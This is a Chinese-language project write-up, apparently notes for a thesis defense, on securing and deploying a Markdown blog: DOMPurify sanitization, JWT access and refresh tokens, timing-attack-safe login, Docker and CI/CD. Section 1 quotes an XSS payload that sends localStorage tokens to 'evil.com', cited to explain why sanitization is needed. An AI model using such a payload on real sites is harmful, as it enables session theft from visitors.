## 一、文章 Markdown 渲染链路

**需求**：文章正文以 Markdown 存储，前端渲染成带语法高亮的 HTML。

**关键难点**：Markdown 规范允许内嵌原始 HTML。如果直接 `v-html` 输出，作者写一句 `<img src=x onerror="fetch('//evil.com?t='+localStorage.token)">` 就能盗走所有访客的登录凭证。**这是一个真实的 XSS 漏洞，不是理论风险。**

**解决**：三道工序，一个都不能省。

```typescript
// apps/web/src/utils/markdown.ts
import MarkdownIt from 'markdown-it';
import hljs from 'highlight.js';
import DOMPurify from 'dompurify';

const md = new MarkdownIt({
  html: true,        // 允许内嵌 HTML（作者需要写 <details> 这类标签）
  linkify: true,     // 裸链接自动转 <a>
  breaks: true,      // 单个换行也当换行（贴近中文写作习惯）
  highlight(code, lang) {
    // ---- 工序2：代码高亮 ----
    if (lang && hljs.getLanguage(lang)) {
      try {
        return `<pre class="hljs"><code>${
          hljs.highlight(code, { language: lang, ignoreIllegals: true }).value
        }</code></pre>`;
      } catch {
        // 高亮失败不能影响渲染，降级到纯文本
      }
    }
    return `<pre class="hljs"><code>${md.utils.escapeHtml(code)}</code></pre>`;
  },
});

// 给代码块加"复制"按钮
export function renderMarkdown(raw: string): string {
  const html = md.render(raw);

  // ---- 工序3：XSS 消毒 ----
  // 白名单模式：只保留安全标签，其余全部剥离。
  // 重点是 <script>、on* 事件属性、javascript: 协议一律清除。
  const clean = DOMPurify.sanitize(html, {
    ADD_ATTR: ['target'],       // 允许 target 属性（外链新窗口打开）
    FORBID_TAGS: ['style', 'form', 'input', 'iframe'], // 这几个必须禁
    FORBID_ATTR: ['onerror', 'onload', 'onclick'],
  });

  return clean;
}
```

**为什么 `html: true` 是可接受的？** 因为消毒这一步兜住了。Markdown-it 只负责转换，不负责安全；安全由 DOMPurify 独立负责。**职责分离是这里的关键设计** —— 不指望一个库同时做好两件事。

**答辩一句话**："Markdown 渲染链路我做了三层：`markdown-it` 负责格式转换、`highlight.js` 负责代码高亮、`DOMPurify` 负责 XSS 消毒。最后这层是必须的，因为 Markdown 允许内嵌 HTML，不消毒就等于给作者开了一个注入后门。"

## 二、JWT 双令牌鉴权

**需求**：后台需要登录；只有管理员能发文章；登录状态要能维持一段时间但不能永久有效。

**关键难点**：单令牌方案有两个死结。

| 方案 | 问题 |
|---|---|
| 只用一个长期 token | 一旦泄漏等于永久失守，且无法撤销 |
| 只用一个短期 token | 用户每 30 分钟就被踢出登录，体验极差 |

**解决**：拆成两个令牌，各司其职。

```typescript
// apps/api/src/utils/auth.ts
export interface AuthPayload {
  sub: number;      // 用户 id
  username: string;
  role: string;
  type: 'access' | 'refresh';   // ← 核心：用 type 区分用途
}

export function signAccessToken(payload: Omit<AuthPayload, 'type'>): string {
  return jwt.sign({ ...payload, type: 'access' }, env.JWT_SECRET, {
    expiresIn: '2h',              // 短：泄漏窗口小
  });
}

export function signRefreshToken(payload: Omit<AuthPayload, 'type'>): string {
  return jwt.sign({ ...payload, type: 'refresh' }, env.JWT_SECRET, {
    expiresIn: '7d',              // 长：用户不用反复登录
  });
}
```

**为什么 `type` 字段是必须的？** 因为两个令牌用**同一个密钥**签名。如果不区分类型，攻击者可以把 refresh token 直接当 access token 用（它们结构完全一样）。加一个 `type` 字段并在中间件里校验，堵住这个洞：

```typescript
// apps/api/src/middlewares/auth.ts
export function requireAuth(req: Request, _res: Response, next: NextFunction): void {
  const token = extractBearerToken(req.headers.authorization);
  if (!token) return next(AppError.unauthorized('缺少访问令牌'));

  try {
    const payload = verifyToken(token);

    // ← 这一行堵住了"refresh token 冒充 access token"的漏洞
    if (payload.type !== 'access') {
      return next(AppError.unauthorized('令牌类型不正确'));
    }

    req.user = payload;
    next();
  } catch {
    // verify 失败（签名不对 / 已过期）统一转 401，
    // 不把底层错误信息透给客户端（避免泄漏实现细节）
    next(AppError.unauthorized('令牌无效或已过期'));
  }
}
```

**两个令牌存在哪？** 这是另一个设计决策：

| 令牌 | 存储位置 | 理由 |
|---|---|---|
| access token | 前端内存变量 | 不放 `localStorage` —— 那样 XSS 一旦成功就能直接读走 |
| refresh token | `httpOnly` Cookie | JS 读不到，XSS 偷不走；`sameSite=lax` 缓解 CSRF |

**答辩一句话**："我用了 access + refresh 双令牌。access 活 2 小时只用来访问接口，refresh 活 7 天只用来换新 access 且存在 httpOnly Cookie 里。这样即使 access 被截获，攻击窗口也只有 2 小时；而 refresh 因为 JS 读不到，XSS 也偷不走。"

## 三、防时序攻击的登录校验

**需求**：登录接口校验用户名密码。

**关键难点**：一个隐蔽的漏洞 —— **通过响应时间差反推用户名是否存在**。

如果实现是"先查用户，查不到立刻返回；查到了再算 bcrypt"，那么：

- 用户名不存在 → 响应耗时 5ms
- 用户名存在但密码错 → 响应耗时 105ms（bcrypt 计算的 100ms）

攻击者用脚本批量请求，统计响应时间，就能**枚举出系统里哪些用户名是真实存在的**。这叫时序攻击（Timing Attack）。

**解决**：用户不存在时，也跑一次假的 bcrypt 比较。

```typescript
// apps/api/src/services/user.service.ts
export async function validateCredentials(username: string, password: string) {
  const user = await prisma.user.findFirst({
    where: { OR: [{ username }, { email: username }] },
  });

  // 注意：两种失败情况返回完全相同的错误信息。
  // 如果分别返回"用户不存在"和"密码错误"，攻击者可以直接从错误文案
  // 判断出用户名是否有效 —— 这叫「用户名枚举漏洞」。
  const INVALID = AppError.unauthorized('用户名或密码错误');

  if (!user) {
    // ← 关键：即使没找到用户，也走一次 bcrypt。
    //   让"用户不存在"和"密码错误"的响应耗时保持一致，
    //   堵住时序攻击的侧信道。
    await comparePassword(
      password,
      '$2a$10$invalidinvalidinvalidinvalidinvalidinvalidinvalidinvalidin'
    );
    throw INVALID;
  }

  const ok = await comparePassword(password, user.passwordHash);
  if (!ok) throw INVALID;

  return user;
}
```

**答辩一句话**："登录校验里我处理了时序攻击。如果用户不存在就直接返回，响应会比密码错误快 100 毫秒，攻击者能靠这个时间差枚举出所有有效用户名。所以我在用户不存在时也执行一次假的 bcrypt 比较，把时间差抹平。"

## 四、Prisma 单例模式（防连接池爆炸）

**需求**：全项目共用一个 Prisma Client 实例。

**关键难点**：开发时用 `tsx watch`，每次改代码文件都会**重新加载模块**。如果 Prisma Client 在模块顶层 `new` 出来，那每保存一次代码就多一个实例，每个实例自带一个连接池。改十次代码 → 十个连接池 → 数据库连接被耗尽 → `Too many connections` 报错。

**解决**：把实例挂在 `globalThis` 上，热重载时复用。

```typescript
// apps/api/src/lib/prisma.ts
import { PrismaClient } from '@prisma/client';
import { env } from '../config/env';

// 把实例存在全局对象上。
// 热重载（tsx watch / nodemon）会重新执行本模块，
// 此时 globalThis 上的实例还在，直接复用而不是新建。
const globalForPrisma = globalThis as unknown as {
  prisma: PrismaClient | undefined;
};

export const prisma =
  globalForPrisma.prisma ??
  new PrismaClient({
    // 生产只记错误，避免 SQL 日志把磁盘写满、把敏感数据写进日志
    // 开发时打开 query 便于调试
    log: env.isProd ? ['error'] : ['query', 'warn', 'error'],
  });

// 生产环境其实不会热重载，但写上无害；
// 开发环境必须写，否则问题不会消失。
if (!env.isProd) {
  globalForPrisma.prisma = prisma;
}
```

**答辩一句话**："Prisma Client 我用了单例模式并挂在 globalThis 上。因为开发环境是热重载，每次改代码模块会重新执行，如果每次都 new 一个实例，连接池会不断堆积，最后把数据库连接耗光。挂全局对象上是 Prisma 官方推荐的做法。"

## 五、Express 的异步错误处理

**需求**：路由里 `await` 抛异常时，能被全局错误中间件统一处理。

**关键难点**：Express 4.x **捕获不到 async 函数抛出的异常**。

```typescript
// ❌ 这样写会出问题
app.get('/api/posts/:slug', async (req, res) => {
  const post = await prisma.article.findUnique({ where: { slug: req.params.slug } });
  if (!post) throw AppError.notFound('文章不存在');  // ← 这个异常没人接
  res.json(post);
});
```

这个异常会变成一个**未处理的 Promise rejection**，Express 完全不知道，请求就一直挂着，直到客户端超时。用户看到的是"转圈圈然后失败"，日志里什么都没有 —— 极难排查。

**解决**：写一个包装函数，把 async 错误转交给 `next()`。

```typescript
// apps/api/src/middlewares/errorHandler.ts

/** 异步路由包装器：把 Promise 的 rejection 转成 next(err) */
export function wrap(
  fn: (req: Request, res: Response, next: NextFunction) => Promise<unknown>
) {
  return (req: Request, res: Response, next: NextFunction) => {
    // .catch(next) 是关键：Promise 被拒绝时，异常进入 next()，
    // Express 就会把它交给后面注册的错误处理中间件。
    // 不加这一行，错误就"沉底"了。
    fn(req, res, next).catch(next);
  };
}
```

用法：

```typescript
// apps/api/src/routes/article.ts
publicRouter.get('/:slug', wrap(articleController.detail));
//                        ^^^^ 这一个词解决所有异步错误捕获问题
```

**全局错误处理器**（必须是 4 个参数，Express 靠参数个数识别）：

```typescript
export function errorHandler(
  err: Error,
  _req: Request,
  res: Response,
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  _next: NextFunction   // ← 这第四个参数不能删！
) {
  // 1. 我们主动抛的业务错误：有明确的 status 和给用户看的信息
  if (err instanceof AppError) {
    return res.status(err.statusCode).json({
      success: false,
      message: err.message,
    });
  }

  // 2. Prisma 唯一约束冲突（比如 slug 重复）
  if (err instanceof Prisma.PrismaClientKnownRequestError) {
    if (err.code === 'P2002') {
      return res.status(409).json({ success: false, message: '数据已存在，请检查是否重复' });
    }
    if (err.code === 'P2025') {
      return res.status(404).json({ success: false, message: '记录不存在' });
    }
  }

  // 3. 意料之外的错误：记详细日志，但只给客户端一句笼统的话。
  //    绝不能把堆栈返回给前端 —— 堆栈里会暴露文件路径、
  //    依赖版本、数据库结构等内部信息，是攻击者最喜欢的情报。
  logger.error('未处理异常', { message: err.message, stack: err.stack });

  return res.status(500).json({
    success: false,
    message: env.isProd ? '服务器内部错误' : err.message,
  });
}
```

**答辩一句话**："Express 4 捕获不到 async 函数的异常，我写了一个 `wrap()` 包装器，用 `.catch(next)` 把 Promise 的 rejection 转交给全局错误中间件。这个错误中间件必须是 4 个参数 —— Express 靠参数个数来识别它是错误处理器而不是普通中间件，这是个容易踩的坑。"

## 六、优雅退出（Graceful Shutdown）

**需求**：容器重启或部署新版本时，不能把正在处理的请求掐断。

**关键难点**：`docker compose down` 会给容器发 `SIGTERM`。如果进程收到信号就立刻退出，正在处理的请求会全部失败，用户看到 502。

**解决**：先停止接受新请求，处理完手头的，再断开数据库连接。

```typescript
// apps/api/src/server.ts
async function bootstrap() {
  // 先连数据库再监听端口 —— 顺序很重要。
  // 如果反过来，会在数据库还没连上时就开始接受请求，导致前几个请求必然失败。
  await prisma.$connect();
  logger.info('数据库连接成功');

  const server = app.listen(env.PORT, () => {
    logger.info(`服务已启动：http://localhost:${env.PORT}`);
  });

  // ---- 优雅退出 ----
  let shuttingDown = false;

  const shutdown = async (signal: string) => {
    // 防止重复触发（比如连按两次 Ctrl+C）
    if (shuttingDown) return;
    shuttingDown = true;

    logger.info(`收到 ${signal}，开始优雅退出...`);

    // 兜底：10 秒内没退干净就强制退出。
    // 没有这个的话，某个请求卡住会导致进程永远不退，
    // 部署脚本会一直等在那里。
    const forceExit = setTimeout(() => {
      logger.error('优雅退出超时，强制终止');
      process.exit(1);
    }, 10_000);
    // unref() 让这个定时器不阻止进程正常退出
    forceExit.unref();

    // server.close() 的行为：停止接受新连接，
    // 但等待正在处理的请求完成（keep-alive 连接会被关闭）
    server.close(async () => {
      logger.info('HTTP 服务已关闭');
      await prisma.$disconnect();
      logger.info('数据库连接已断开');
      process.exit(0);
    });
  };

  process.on('SIGTERM', () => shutdown('SIGTERM')); // docker stop 发的就是它
  process.on('SIGINT', () => shutdown('SIGINT'));   // Ctrl+C

  // 未捕获的 Promise rejection：记日志，但不退出。
  // 因为很多库会抛出无害的 rejection，直接退出会导致服务频繁重启。
  process.on('unhandledRejection', (reason) => {
    logger.error('未处理的 Promise rejection', { reason });
  });

  // 未捕获的同步异常：这个必须退出。
  // 因为进程状态已经不可信，继续跑可能产生错误数据。
  process.on('uncaughtException', (err) => {
    logger.error('未捕获的异常', { message: err.message, stack: err.stack });
    shutdown('uncaughtException');
  });
}
```

**答辩一句话**："我实现了优雅退出。容器收到 SIGTERM 时，先停止接受新连接、等正在处理的请求完成，再断开数据库，最后才退出进程。同时加了 10 秒兜底强制退出，防止某个请求卡死让部署脚本一直挂着。"

## 七、Docker Compose 编排（加分项1 核心）

**需求**：一条命令拉起前端、后端、数据库三个服务。

**关键难点**：启动顺序。后端必须等数据库**真正就绪**，而不是等容器**启动**。

```yaml
# docker-compose.yml
services:
  db:
    image: mysql:8.0
    healthcheck:
      # ← 用 mysqladmin ping 探测真实可用性
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 5s
      timeout: 5s
      retries: 20
      start_period: 30s      # 首次初始化 30 秒内失败不算失败

  api:
    build:
      context: .
      dockerfile: apps/api/Dockerfile
    depends_on:
      db:
        condition: service_healthy   # ← 关键：等健康检查通过

  web:
    ports:
      - "8080:80"   # ← 只有这一个服务对外暴露端口
```

**为什么 `service_healthy` 而不是 `service_started`？**

容器"启动"和"服务可用"是两件事。MySQL 容器进程起来后，还要初始化数据目录、建系统表，这期间端口虽然开着，但连接会被拒绝。

- `service_started`：容器进程起来了就走 → 后端可能在 MySQL 就绪前启动 → 连接失败退出
- `service_healthy`：健康检查通过才走 → 保证数据库真的能响应查询

**为什么只有 web 暴露端口？** 这叫最小暴露面原则。

`api` 和 `db` 只挂在 compose 的内部 bridge 网络里，互相用**服务名当主机名**通信（所以后端连库地址是 `db:3306` 而不是 `localhost:3306`）。数据库不碰公网，被攻击面就小了一个数量级。

**答辩一句话**："Compose 编排里我重点处理了启动顺序：MySQL 用 healthcheck 做真实可用性探测，api 用 `condition: service_healthy` 等它真正就绪才启动。这个区别很关键 —— 容器 running 不代表服务 ready。另外只有 web 服务暴露端口，数据库和 API 都在内部网络里，这是最小暴露面原则。"

## 八、多阶段构建（镜像体积优化）

**需求**：后端镜像尽量小，加快部署和拉取。

**关键难点**：直接 `FROM node:20` 装依赖再跑，镜像会有 900MB 左右，其中大部分是构建时才需要的东西。

```dockerfile
# apps/api/Dockerfile

# ---------- 阶段1：装依赖 ----------
FROM node:20-alpine AS deps
WORKDIR /app
# ← 先只拷贝 package.json。利用 Docker 层缓存：
#   只要依赖清单没变，改业务代码时这一层缓存依然命中，
#   构建从 4 分钟降到几秒。
COPY package.json package-lock.json* ./
COPY apps/api/package.json ./apps/api/
RUN npm ci --no-audit --no-fund

# ---------- 阶段2：编译 TS ----------
FROM node:20-alpine AS builder
COPY --from=deps /app/node_modules ./node_modules
COPY apps/api ./apps/api
RUN cd apps/api && npx prisma generate
RUN cd apps/api && npm run build

# ---------- 阶段3：运行时 ----------
FROM node:20-alpine AS runner
ENV NODE_ENV=production

# ← 安全加固：不用 root 跑应用
RUN addgroup -g 1001 -S nodejs && adduser -S nodejs -u 1001

# 只拷运行时真正需要的：生产依赖 + 编译产物 + prisma schema
# 源码、devDependencies、typescript 编译器全都留在前两个阶段，不进最终镜像
COPY --from=deps /app/node_modules ./node_modules
COPY --from=builder /app/apps/api/dist ./apps/api/dist
COPY --from=builder /app/apps/api/prisma ./apps/api/prisma

RUN apk add --no-cache openssl   # Prisma 的 query engine 依赖它

USER nodejs          # ← 切换到非 root 用户
EXPOSE 3000
CMD ["sh", "-c", "npx prisma migrate deploy && node dist/server.js"]
```

**体积对比：**

| 方式 | 体积 | 说明 |
|---|---|---|
| 单阶段 | ~900MB | 含源码、devDeps、npm 缓存、TS 编译器 |
| 多阶段 | ~180MB | 只留运行必需的 |

**为什么用非 root 用户？** 容器逃逸类漏洞的前提通常是"容器内进程是 root"。用普通用户跑，即使应用被攻破，攻击者拿到的也只是容器内的低权限账号，横向移动的难度大幅提高。

**答辩一句话**："后端镜像我用了多阶段构建，最终镜像从 900MB 降到 180MB，省掉的是 devDependencies、TypeScript 源码和 npm 缓存。同时用非 root 用户运行，这是容器安全的基本要求。构建时先只拷 package.json 再装依赖，利用层缓存让重复构建从几分钟降到几秒。"

## 九、CI/CD 流水线（加分项2 核心）

**需求**：push 代码后自动检查、构建、部署。

**解决**：三个 job 用 `needs` 串成有向图。

```yaml
# .github/workflows/ci-cd.yml
jobs:
  # 阶段1：质量门禁
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm              # ← 缓存 npm 依赖
      - run: npm ci --no-audit --no-fund
      - run: npx prisma generate --schema=apps/api/prisma/schema.prisma
      - run: npx tsc --noEmit -p apps/api/tsconfig.json   # ← 类型检查

  # 阶段2：构建并推送镜像（依赖阶段1通过）
  build-and-push:
    needs: lint                    # ← 关键：lint 不过就不构建，快速失败
    if: github.event_name != 'pull_request'   # PR 只检查不推镜像
    permissions:
      packages: write              # 推 GHCR 需要
    strategy:
      matrix:
        include:
          - { name: api, dockerfile: apps/api/Dockerfile }
          - { name: web, dockerfile: apps/web/Dockerfile }   # ← 前后端并行构建
    steps:
      - uses: docker/build-push-action@v6
        with:
          push: true
          cache-from: type=gha,scope=${{ matrix.name }}   # ← GitHub 构建缓存
          cache-to: type=gha,mode=max,scope=${{ matrix.name }}

  # 阶段3：部署到服务器
  deploy:
    needs: build-and-push
    if: github.ref == 'refs/heads/main'   # 只有 main 分支才部署
    steps:
      - uses: appleboy/ssh-action@v1.0.3
        with:
          host: ${{ secrets.SERVER_HOST }}
          key: ${{ secrets.SERVER_SSH_KEY }}
          script: |
            docker compose pull
            docker compose up -d --remove-orphans
            docker image prune -f     # ← 清理旧镜像，防止磁盘被撑爆
```

**三个设计决策：**

**1. 为什么 `needs: lint`？** 快速失败。类型检查不过，说明代码有问题，没必要浪费时间和 GitHub Actions 的额度去构建镜像。

**2. 为什么用 GHCR 而不是 Docker Hub？** GHCR 用仓库自带的 `GITHUB_TOKEN` 鉴权，不需要在 Secrets 里额外配 Docker Hub 账号密码。密钥越少，泄漏面越小。

**3. 为什么部署阶段要 `image prune`？** 每推一次代码就多一个镜像标签，不清理的话服务器磁盘很快被撑满。这是最容易忽略但一定会出问题的一点。

**答辩一句话**："CI/CD 分三个阶段：lint 做质量门禁、build 并行构建前后端镜像推到 GHCR、deploy 通过 SSH 在服务器上拉取新镜像滚动重启。用 `needs` 串联实现快速失败 —— 类型检查不过就不会浪费资源去构建。最后一步清理悬空镜像，否则磁盘会被历史版本撑爆。"

## 十、代码组织：三层架构

```
请求 → routes/ → controllers/ → services/ → Prisma → MySQL
       (路由)     (解析响应)      (业务逻辑)   (数据访问)
```

| 层 | 文件 | 只做 | 不做 |
|---|---|---|---|
| **routes** | `routes/article.ts` | 把 HTTP 方法+路径映射到 controller | 任何业务逻辑 |
| **controllers** | `controllers/article.controller.ts` | 校验入参、调用 service、组装响应 | 业务规则 |
| **services** | `services/article.service.ts` | 业务逻辑、数据操作 | 接触 `req` / `res` |

**为什么要分？** 三个具体好处：

1. **可测试**：service 不依赖 HTTP，可以脱离 Express 单独跑测试
2. **可复用**：登录接口和修改密码都要校验密码，同一段 service 逻辑被两处调用
3. **可替换**：以后要把 Express 换成 Fastify，只需要改 routes 和少量 controller，service 完全不动

**答辩一句话**："代码按 routes / controllers / services 三层组织。controller 只做参数校验和响应组装，业务逻辑全在 service 里。这样拆分的好处是 service 不依赖 HTTP，可以独立测试，也能被多个接口复用。"
